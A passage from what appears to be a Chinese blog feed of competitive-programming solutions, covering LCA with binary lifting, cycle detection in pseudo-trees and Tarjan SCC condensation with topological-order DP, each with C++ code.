class="headerlink" title="题目练手"></a>题目练手</h2><p><a href="https://www.luogu.com.cn/problem/P3379">洛谷P3379</a> </p><p>标版，直接打就完事了。这里需要注意一下，如果深度不一样那么先平衡深度这个操作，这个操作我们并不是也要一个一个平衡的，也可以用倍增的思路。我先算出两深度之差，把差拆分为二进制比特位，如果从第往高第 $i$ 位为 $1$，那么我就往前寻找 $2^i$ 个祖先，而从当前点往前寻找 $2^i$ 个祖先我们可以直接用 $fa[now][i]$ 来快速求得。如果它构造特殊数据，那么直接一位一位往前寻找平衡深度可能会导致超时。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,lg[maxn],n,q,s;</span><br><span class="line"><span class="keyword">int</span> fa[maxn][<span class="number">25</span>],depth[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    fa[now][<span class="number">0</span>]=p;</span><br><span class="line">    depth[now]=depth[p]+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;point=%d deep=%d\n&quot;,now,depth[now]);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lg[depth[now]];i++)&#123;</span><br><span class="line">        fa[now][i]=fa[fa[now][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to!=p)</span><br><span class="line">            <span class="built_in">dfs</span>(to,now);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(depth[a]&gt;depth[b])&#123;</span><br><span class="line">        <span class="built_in">swap</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x=depth[b]-depth[a];</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;a=%d,b=%d\n&quot;,a,b);</span></span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            b=fa[b][k];</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">        x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;deep=%d\n&quot;,depth[b]);</span></span><br><span class="line">    k=lg[depth[a]];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b);</span><br><span class="line">    <span class="keyword">while</span>(k!=<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;k=%d\n&quot;</span>,k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,fa[a][k],fa[b][k]);</span><br><span class="line">        <span class="keyword">if</span>(fa[a][k]==fa[b][k])k--;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a=fa[a][k];</span><br><span class="line">            b=fa[b][k];</span><br><span class="line">            <span class="comment">//k=lg[depth[a]];</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a==b)<span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> fa[a][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;q&gt;&gt;s;</span><br><span class="line">    lg[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;&gt;(lg[i<span class="number">-1</span>]+<span class="number">1</span>))lg[i]=lg[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> lg[i]=lg[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="built_in">add</span>(x,y);</span><br><span class="line">        <span class="built_in">add</span>(y,x);</span><br><span class="line">    &#125;</span><br><span class="line">    depth[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(s,s);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">LCA</span>(a,b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> LCA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P6037题解</title>
      <link href="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P6037">洛谷P6037</a>题解</p><span id="more"></span><h2 id="浅谈基环树-环套树"><a href="#浅谈基环树-环套树" class="headerlink" title="浅谈基环树(环套树)"></a>浅谈基环树(环套树)</h2><p>在题目开始之前，就唠一唠这个叫基环树的结构。准确来说，基环树它已经不是树了，我们知道，树一定是由 $n$ 点和 $n-1$ 条边组成的。而基环树是由 $n$ 点与 $n$ 边组成。但是因为它跟树还是很像，并且在保证连通的情况下有且仅有一个简单环，因此得名。如果不连通，那么它会成为基环树森林。</p><p><img src="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>比如上图就是一个基环树。我们可以很清楚的看出来，点 $2,1,3,7$ 形成了环，断开任意一条属于环中的边都会使这个棵基环树成为树。一般情况下都是将环和环连接的子树进行分开讨论。如何求环呢？我们只需要 dfs 一遍就行了，如果遇到被访问过的点，那就依次返回路径上的所有点，直到我遇到的那个点为止。</p><p>举个例子，在上图中，我从 6 开始 dfs，假设它经历了 $6 \to 2 \to 1 \to 3 \to 7$ 的顺序。那么接下来在搜索 7 的时候就会发现与它相连的点 2 已经被访问过，那么我返回值给个 2，依次回溯，回溯过程中将点入栈或者入一个 $vector$ 都可以。直到回溯到 2 这个点为止。环就被我们求出来了。</p><p>能求出环我们就会很好做这类的题目了，那么我们具体看看这题吧。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Ryoku 所处的世界可以抽象成一个有 n 个点， n条边的带权无向连通图 G。每条边有美观度和长度。</p><p>Ryoku 会使用这样一个策略探索世界：在每个点寻找一个<strong>端点她未走过</strong>的边中<strong>美观度最高</strong>的走，如果没有边走，就沿着她前往这个点的边返回，类似于图的<strong>深度优先遍历</strong>。</p><p>探索的一个方案的长度是这个方案所经过的所有边长度的和（返回时经过的长度不用计算）。</p><p>她想知道，对于每一个起点 $s=1,2,\cdots,n$，她需要走过的长度是多少？</p><hr><p>$n$ 个点 $n$ 条边的连通图，那么肯定就是基环树了然后它会根据美观度与深度优先的一种搜索策略，即遇到分支先沿一条分支走完再走另一条分支，并且多条分支优先搜索美观度高的分支。回溯走的路不算，问你以不同的点为起点搜索完所有的点需要走多少长度。</p><p>我们不难得出，如果要遍历 $n$ 个点，我们只需要走过 $n-1$ 条边。而对于一棵树而言，对它深度优先搜索一定会遍历树上所有的边。因此如果把基环树拆开称为一个环和若干个子树，我们就只需要在环上讨论情况，子树的所有边一定是都会走过的。对于同一个环，我先向右边遍历和先向左边遍历走的路径是完全不一样的，如果先向右边那必然导致它左边不会被走过，同理先走左边那右边就不会被走过。</p><p>再根据题中的策略，对于环上的点，我们只需要循环一遍环上的所有点，观察与它连接的在环上的边的美观度哪个比较大，那么答案就是所有图的边权减去那个美观度较小的边权。对于不在环上的点我们可以观察它所在的子树连接在环的哪个点，因为从那个点遍历出来最终也会从它所在的子树走向环的那个点，然后情况就变成了在换上对应的点遍历的情况了。</p><p>所以我们先大致描述一下算法流程：</p><ul><li>将边按照出点读入 $vector$ 当中，并且按美观度排序</li><li>dfs 跑出环上的点将其标记</li><li>对环上所有的点进行答案计算</li><li>对环上的点再跑一次dfs，然后搜索策略为非环上的点，将搜索到的点标记为环上对应的那个点</li><li>最后答案就出来了</li></ul><h2 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 3000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> visited[maxn],ans[maxn],n;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> sum_len,res[maxn];<span class="comment">//不开long long见祖宗</span></span><br><span class="line">vector&lt;eee&gt;edge[maxn];<span class="comment">//用vector数组保存边方便排序</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//保存环上的点</span></span><br><span class="line"><span class="keyword">bool</span> in_stack[maxn];<span class="comment">//因为我原来使用栈保存的因此命名这个，表示点是否在环上</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    eee e;</span><br><span class="line">    e.to=y;</span><br><span class="line">    e.w=w;</span><br><span class="line">    e.p=p;</span><br><span class="line">    edge[x].<span class="built_in">push_back</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(eee a,eee b)</span></span>&#123;<span class="comment">//按美观度排序</span></span><br><span class="line">    <span class="keyword">return</span> a.p&gt;b.p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(visited[u])&#123;<span class="comment">//如果搜索到了被标记过的点则说明遇到环了</span></span><br><span class="line">        <span class="keyword">return</span> u;</span><br><span class="line">    &#125;</span><br><span class="line">    visited[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> value=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line">        <span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//防止逆搜索，并防止对环重新搜索</span></span><br><span class="line">        <span class="comment">//从环的起点开始，假如我顺时针跑出了环，那么它下一条边将会逆时针跑环</span></span><br><span class="line">        <span class="comment">//可以看到仅仅限制条件v!=pre是远远不够的。</span></span><br><span class="line">        <span class="keyword">int</span> tmp=<span class="built_in">dfs</span>(v,u);</span><br><span class="line">        <span class="keyword">if</span>(tmp)&#123;<span class="comment">//若返回结果不为0则说明遇到环，并且本点也在换上，就保存。</span></span><br><span class="line">            value=tmp;</span><br><span class="line">            <span class="keyword">if</span>(value==u)&#123;</span><br><span class="line">                <span class="comment">//我判断出环的那个点一定是环的起点，如果回溯过程中遇到了说明环已经保存完了</span></span><br><span class="line">                <span class="comment">//再往前回溯的点就不属于环了</span></span><br><span class="line">                value=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s.<span class="built_in">push_back</span>(u);</span><br><span class="line">            in_stack[u]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs2</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> pre,<span class="keyword">int</span> flag)</span></span>&#123;<span class="comment">//这里搜索环的子树，将子树上所有点标记为子树与环直接相连的一个点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it=edge[u].<span class="built_in">begin</span>();it!=edge[u].<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=it-&gt;to;</span><br><span class="line">        <span class="keyword">if</span>(v==pre||in_stack[v])<span class="keyword">continue</span>;<span class="comment">//这里我们排除环上的点遍历的一定就都是子树</span></span><br><span class="line">        ans[v]=flag;<span class="comment">//ans保存本点答案与哪个点的答案一致。</span></span><br><span class="line">        <span class="built_in">dfs2</span>(v,u,flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w,p;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w,p);</span><br><span class="line">        sum_len+=w;<span class="comment">//读入边，将边权之和保存。</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">sort</span>(edge[i].<span class="built_in">begin</span>(),edge[i].<span class="built_in">end</span>(),cmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;<span class="comment">//给子树标记</span></span><br><span class="line">        <span class="built_in">dfs2</span>(*i,<span class="number">0</span>,*i);</span><br><span class="line">        ans[*i]=*i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=s.<span class="built_in">begin</span>();i!=s.<span class="built_in">end</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> j=edge[*i].<span class="built_in">end</span>()<span class="number">-1</span>;j!=edge[*i].<span class="built_in">begin</span>()<span class="number">-1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_stack[j-&gt;to])&#123;<span class="comment">//因为我们是按照美观度从大到小排序的，所以从后面开始找到第一个在环上的点一定是美观度较小的边，答案就是减去美观度较小的边权。</span></span><br><span class="line">                res[*i]=sum_len-(j-&gt;w);<span class="comment">//res数组保存答案</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res[ans[i]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 基环树 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P2656题解</title>
      <link href="/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P2656">洛谷P2656</a>题解。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>小胖和 ZYR 要去 ESQMS 森林采蘑菇。</p><p>ESQMS 森林间有 N个小树丛，M 条小径，每条小径都是单向的，连接两个小树丛，上面都有一定数量的蘑菇。小胖和 ZYR 经过某条小径一次，可以采走这条路上所有的蘑菇。由于 ESQMS 森林是一片神奇的沃土，所以一条路上的蘑菇被采过后，又会长出一些新的蘑菇，数量为原来蘑菇的数量乘上这条路的“恢复系数”，再下取整。</p><p>比如，一条路上有 4个蘑菇，这条路的“恢复系数”为 0.70，则第一~四次经过这条路径所能采到的蘑菇数量分别为 4,2,1,0。</p><p>现在，小胖和 ZYR 从 S号小树丛出发，求他们最多能采到多少蘑菇。</p><hr><p>就是沿线采蘑菇，然后给定起点，没有给终点，蘑菇采完后会复活，复活的个数为上一次的个数×恢复系数。路是单向的，那么可以据此建一个有向图。如果一条边的两个顶点在同一个强连通分量内的话，那么这条边我可以经过无数次，这很容易证明。但是如果一条边的两个点不在同一个强连通分量，那么我只能采一次上面的蘑菇。因为题目没有规定不能反复横跳，所以我们可以先tarjan缩点然后把内部的边权集中到点上，再集中的时候只需要注意一定是要×系数累加上去的，因为我能无数次经过。</p><p>缩点之后就是对DAG处理，我看大佬们用的都是最短路径算法，这里菜鸡只会拓扑排序qwq。</p><p>这里还需要注意的是，起点所在的强连通分量如果入读不为0那么那些蘑菇我是采不到的。因此我在这里设立一个flag标记，在拓扑排序的时候如果flag为0那么我只把点和边删了，不做数值上的处理。然后我对起点所在的强连通分量flag设1，然后如果flag为1则会向后面的点传递。</p><p>在写状态转移方程的时候注意要把路上的蘑菇和那个点的蘑菇都加上。</p><p>如果路径上的蘑菇为w，v强连通分量上的蘑菇数为$amount[v]$。那么$u-&gt;v$的状态转移方程就应该是</p><p>$ans[v]=max(ans[v],ans[u]+w+amount[v])$</p><p>最后注意一个，那就是一定要记着不管怎样给最终结果赋一个初始值就是起点所在强连通分量的蘑菇数量，这里卡了一下。</p><p>下面给出AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 80005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">float</span> p;</span><br><span class="line">&#125;edge[maxn*<span class="number">3</span>],e[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],visited[maxn],s[maxn],degree[maxn],num[maxn],amount[maxn],ans[maxn],flag[maxn],cnt,cnt2,tot,top,deep,n,m;</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;ss;<span class="comment">//拓扑排序用的栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//一开始的建图</span></span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    edge[cnt].p=p;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//强连通分量的建图</span></span><br><span class="line">    degree[y]++;</span><br><span class="line">    e[++cnt2].next=root2[x];</span><br><span class="line">    e[cnt2].to=y;</span><br><span class="line">    e[cnt2].w=w;</span><br><span class="line">    e[cnt2].p=p;</span><br><span class="line">    root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;<span class="comment">//tarjan板子</span></span><br><span class="line">    visited[u]=<span class="number">1</span>;</span><br><span class="line">    dfn[u]=low[u]=++deep;</span><br><span class="line">    s[++top]=u;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line">            <span 